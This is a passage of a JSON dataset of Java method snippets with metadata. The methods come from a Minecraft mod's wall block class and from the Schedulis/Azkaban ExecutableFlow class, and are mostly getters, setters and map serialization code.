null, "modifiers": ["public", "static"]}}, {"method_name": "isNormalCube", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean isNormalCube(BlockState state, IBlockReader worldIn, BlockPos pos) {\t\t\treturn false;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "WallBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "propagatesSkylightDown", "params": ["BlockState", "IBlockReader", "BlockPos"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\t\tpublic boolean propagatesSkylightDown(BlockState state, IBlockReader reader, BlockPos pos) {\t\t\treturn true;\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "WallBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/CharredNetherBrickWallBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "WallBlock", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "createExecutableFlowFromObject", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "ExecutableFlow", "snippet": "  public static ExecutableFlow createExecutableFlowFromObject(final Object obj) {    final ExecutableFlow exFlow = new ExecutableFlow();    final HashMap<String, Object> flowObj = (HashMap<String, Object>) obj;    exFlow.fillExecutableFromMapObject(flowObj);    return exFlow;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getId() {    return getFlowId();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutableFlow", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getExecutableFlow() {    return this;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "addAllProxyUsers", "params": ["Collection<String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void addAllProxyUsers(final Collection<String> proxyUsers) {    this.proxyUsers.addAll(proxyUsers);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getProxyUsers", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Set<String>", "snippet": "  public Set<String> getProxyUsers() {    return new HashSet<>(this.proxyUsers);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutionOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExecutionOptions", "snippet": "  public ExecutionOptions getExecutionOptions() {    return this.executionOptions;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastNsWtss", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean getLastNsWtss() {    return lastNsWtss;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setLastNsWtss", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLastNsWtss(boolean lastNsWtss) {    this.lastNsWtss = lastNsWtss;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNsWtss", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean getNsWtss() {    return nsWtss;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setNsWtss", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setNsWtss(boolean nsWtss) {    this.nsWtss = nsWtss;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getRunDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRunDate() {    return runDate;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setRunDate", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRunDate(String runDate) {    this.runDate = runDate;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutionOptions", "params": ["ExecutionOptions"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setExecutionOptions(final ExecutionOptions options) {    this.executionOptions = options;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getSlaOptions", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<SlaOption>", "snippet": "  public List<SlaOption> getSlaOptions() {    return this.slaOptions;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setSlaOptions", "params": ["List<SlaOption>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSlaOptions(final List<SlaOption> slaOptions) {    this.slaOptions = slaOptions;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setFlow", "params": ["Project", "Flow"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void setFlow(final Project project, final Flow flow) {    super.setFlow(project, flow);    this.executionOptions = new ExecutionOptions();    this.executionOptions.setMailCreator(flow.getMailCreator());    if (flow.getSuccessEmails() != null) {      this.executionOptions.setSuccessEmails(flow.getSuccessEmails());    }    if (flow.getFailureEmails() != null) {      this.executionOptions.setFailureEmails(flow.getFailureEmails());    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutionId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getExecutionId() {    return this.executionId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutorIds", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Integer>", "snippet": "  public List<Integer> getExecutorIds() {    return executorIds;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutorIds", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setExecutorIds(List<Integer> executorIds) {    this.executorIds = executorIds;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutionId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setExecutionId(final int executionId) {    this.executionId = executionId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastModifiedTimestamp", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastModifiedTimestamp() {    return this.lastModifiedTimestamp;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setLastModifiedTimestamp", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLastModifiedTimestamp(final long lastModifiedTimestamp) {    this.lastModifiedTimestamp = lastModifiedTimestamp;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getLastModifiedByUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getLastModifiedByUser() {    return this.lastModifiedUser;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setLastModifiedByUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setLastModifiedByUser(final String lastModifiedUser) {    this.lastModifiedUser = lastModifiedUser;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getProjectId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getProjectId() {    return this.projectId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setProjectId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setProjectId(final int projectId) {    this.projectId = projectId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getProjectName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getProjectName() {    return this.projectName;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getScheduleId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getScheduleId() {    return this.scheduleId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setScheduleId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setScheduleId(final int scheduleId) {    this.scheduleId = scheduleId;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutionPath", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getExecutionPath() {    return this.executionPath;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutionPath", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setExecutionPath(final String executionPath) {    this.executionPath = executionPath;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getSubmitUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSubmitUser() {    return this.submitUser;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setSubmitUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSubmitUser(final String submitUser) {    this.submitUser = submitUser;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVersion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getVersion() {    return this.version;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setVersion", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setVersion(final int version) {    this.version = version;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getSubmitTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getSubmitTime() {    return this.submitTime;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setSubmitTime", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSubmitTime(final long submitTime) {    this.submitTime = submitTime;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getAzkabanFlowVersion", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "  public double getAzkabanFlowVersion() {    return this.azkabanFlowVersion;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setAzkabanFlowVersion", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAzkabanFlowVersion(final double azkabanFlowVersion) {    this.azkabanFlowVersion = azkabanFlowVersion;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getRepeatOption", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getRepeatOption() {    return repeatOption;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getCycleOption", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "  public Map<String, String> getCycleOption() {    return cycleOption;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setRepeatOption", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRepeatOption(Map<String, String> repeatOption) {    this.repeatOption = repeatOption;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setCycleOption", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCycleOption(Map<String, String> cycleOption) {    this.cycleOption = cycleOption;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFlowType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getFlowType() {    return flowType;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setFlowType", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlowType(int flowType) {    this.flowType = flowType;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "getOtherOption", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> getOtherOption() {    return otherOption;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "setOtherOption", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setOtherOption(Map<String, Object> otherOption) {    this.otherOption = otherOption;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "toObject", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> toObject() {    final HashMap<String, Object> flowObj = new HashMap<>();    fillMapFromExecutable(flowObj);    flowObj.put(EXECUTIONID_PARAM, this.executionId);    flowObj.put(EXECUTIONPATH_PARAM, this.executionPath);    flowObj.put(PROJECTID_PARAM, this.projectId);    flowObj.put(PROJECTNAME_PARAM, this.projectName);    if (this.scheduleId >= 0) {      flowObj.put(SCHEDULEID_PARAM, this.scheduleId);    }    flowObj.put(SUBMITUSER_PARAM, this.submitUser);    flowObj.put(VERSION_PARAM, this.version);    flowObj.put(LASTMODIFIEDTIME_PARAM, this.lastModifiedTimestamp);    flowObj.put(LASTMODIFIEDUSER_PARAM, this.lastModifiedUser);    flowObj.put(AZKABANFLOWVERSION_PARAM, this.azkabanFlowVersion);    flowObj.put(EXECUTIONOPTIONS_PARAM, this.executionOptions.toObject());    final ArrayList<String> proxyUserList = new ArrayList<>(this.proxyUsers);    flowObj.put(PROXYUSERS_PARAM, proxyUserList);    flowObj.put(SUBMITTIME_PARAM, this.submitTime);    final List<Map<String, Object>> slaOptions = new ArrayList<>();    this.getSlaOptions().stream().forEach((slaOption) -> slaOptions.add(slaOption.toObject()));    flowObj.put(SLAOPTIONS_PARAM, slaOptions);    //\u5386\u53f2\u8865\u91c7\u6570\u636e\u7ec4\u88c5    final Map<String, String> repeatOption = this.getRepeatOption();    flowObj.put(REPEATOPTIONS_PARAM, repeatOption);    //\u5faa\u73af\u6267\u884c\u6570\u636e\u7ec4\u88c5    final Map<String, String> cycleOptions = this.getCycleOption();    flowObj.put(CYCLEOPTIONS_PARAM, cycleOptions);    flowObj.put(FLOWTYPE_PARAM, this.flowType);    final Map<String, Object> otherOption = this.getOtherOption();    flowObj.put(OTHEROPTIONS_PARAM, otherOption);    final Map<String, String> userProps = this.getUserProps();    flowObj.put(USERPROPS_PARAM, userProps);    final Map<String, String> flowFailedRetry = this.getFlowFailedRetry();    flowObj.put(FLOW_FAILED_RETRY_PARAM, flowFailedRetry);    flowObj.put(FLOW_FALIED_SKIPED_PARAM, this.getFailedSkipedAllJobs());    final List<Integer> executorIds = this.getExecutorIds();    flowObj.put(EXECUTOR_IDS_PARAM, executorIds);    final Map<String, String> jobOutputGlobalParam = this.getJobOutputGlobalParam();    flowObj.put(JOB_OUTPUT_GLOBAL_PARAM, jobOutputGlobalParam);    String runDate = this.getRunDate();    if(runDate != null){      flowObj.put(RUN_DATE_PARAM, runDate);    }    flowObj.put(NS_WTSS_PARAM, this.getNsWtss());    flowObj.put(LAST_NS_WTSS_PARAM, this.getLastNsWtss());    return flowObj;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "fillExecutableFromMapObject", "params": ["TypedMapWrapper<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void fillExecutableFromMapObject(      final TypedMapWrapper<String, Object> flowObj) {    super.fillExecutableFromMapObject(flowObj);    this.executionId = flowObj.getInt(EXECUTIONID_PARAM);    this.executionPath = flowObj.getString(EXECUTIONPATH_PARAM);    this.projectId = flowObj.getInt(PROJECTID_PARAM);    this.projectName = flowObj.getString(PROJECTNAME_PARAM);    this.scheduleId = flowObj.getInt(SCHEDULEID_PARAM);    this.submitUser = flowObj.getString(SUBMITUSER_PARAM);    this.version = flowObj.getInt(VERSION_PARAM);    this.lastModifiedTimestamp = flowObj.getLong(LASTMODIFIEDTIME_PARAM);    this.lastModifiedUser = flowObj.getString(LASTMODIFIEDUSER_PARAM);    this.submitTime = flowObj.getLong(SUBMITTIME_PARAM);    this.azkabanFlowVersion = flowObj.getDouble(AZKABANFLOWVERSION_PARAM);    if (flowObj.containsKey(EXECUTIONOPTIONS_PARAM)) {      this.executionOptions =          ExecutionOptions.createFromObject(flowObj              .getObject(EXECUTIONOPTIONS_PARAM));    } else {      // for backwards compatibility should remove in a few versions.      this.executionOptions = ExecutionOptions.createFromObject(flowObj);    }    if (flowObj.containsKey(PROXYUSERS_PARAM)) {      final List<String> proxyUserList = flowObj.<String>getList(PROXYUSERS_PARAM);      this.addAllProxyUsers(proxyUserList);    }    if (flowObj.containsKey(SLAOPTIONS_PARAM)) {      final List<SlaOption> slaOptions =          flowObj.getList(SLAOPTIONS_PARAM).stream().map(SlaOption::fromObject)              .collect(Collectors.toList());      this.setSlaOptions(slaOptions);    }    // \u8bbe\u7f6e\u6570\u636e\u8865\u91c7\u53c2\u6570    if(flowObj.containsKey(REPEATOPTIONS_PARAM)){      final Map<String, String> repeatOption = flowObj.getMap(REPEATOPTIONS_PARAM);      this.setRepeatOption(repeatOption);    }    // \u8bbe\u7f6e\u5faa\u73af\u6267\u884c\u53c2\u6570    if(flowObj.containsKey(CYCLEOPTIONS_PARAM)){      final Map<String, String> cycleOption = flowObj.getMap(CYCLEOPTIONS_PARAM);      this.setCycleOption(cycleOption);    }    // \u8bbe\u7f6eFlow\u7c7b\u578b    this.setFlowType(flowObj.getInt(FLOWTYPE_PARAM));    //\u8bbe\u7f6e\u5176\u4ed6\u6570\u636e\u53c2\u6570    if(flowObj.containsKey(OTHEROPTIONS_PARAM)){      final Map<String, Object> otherOptions = flowObj.getMap(OTHEROPTIONS_PARAM);      this.setOtherOption(otherOptions);    }    if(flowObj.containsKey(USERPROPS_PARAM)){      final Map<String, String> userProps = flowObj.getMap(USERPROPS_PARAM);      this.setUserProps(userProps);    }    if(flowObj.containsKey(FLOW_FAILED_RETRY_PARAM)){      final Map<String, String> flowFailedRetry = flowObj.getMap(FLOW_FAILED_RETRY_PARAM);      this.setFlowFailedRetry(flowFailedRetry);    }    if(flowObj.containsKey(EXECUTOR_IDS_PARAM)){      final List<Integer> executorIds = (ArrayList)flowObj.getList(EXECUTOR_IDS_PARAM, new ArrayList<>());      this.setExecutorIds(executorIds);    }    if(flowObj.containsKey(FLOW_FALIED_SKIPED_PARAM)){      boolean flowFailedSkipedAllJobs = flowObj.getBool(FLOW_FALIED_SKIPED_PARAM, false);      this.setFailedSkipedAllJobs(flowFailedSkipedAllJobs);    }    if(flowObj.containsKey(JOB_OUTPUT_GLOBAL_PARAM)){      final ConcurrentHashMap<String, String> jobOutputGlobalParam = new ConcurrentHashMap(flowObj.getMap(JOB_OUTPUT_GLOBAL_PARAM));      this.setJobOutputGlobalParam(jobOutputGlobalParam);    }    if(flowObj.containsKey(RUN_DATE_PARAM)){      this.setRunDate(flowObj.getString(RUN_DATE_PARAM));    }    this.setNsWtss(flowObj.getBool(NS_WTSS_PARAM, true));    this.setLastNsWtss(flowObj.getBool(LAST_NS_WTSS_PARAM, true));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutableFlow.java", "stars": "18", "class": {"name": "ExecutableFlow", "extends": "ExecutableFlowBase", "implements": null, "modifiers": ["public"]}}, {"method_name": "toUpdateObject", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "Map<String,Object>", "snippet": "  public Map<String, Object> toUpdateObject(final long lastUpdateTime) {    final Map<String, Object> updateData = super.toUpdateObject(lastUpdateTime);    updateData.put(EXECUTIONID_PARAM, this.executionId);    return updateData;  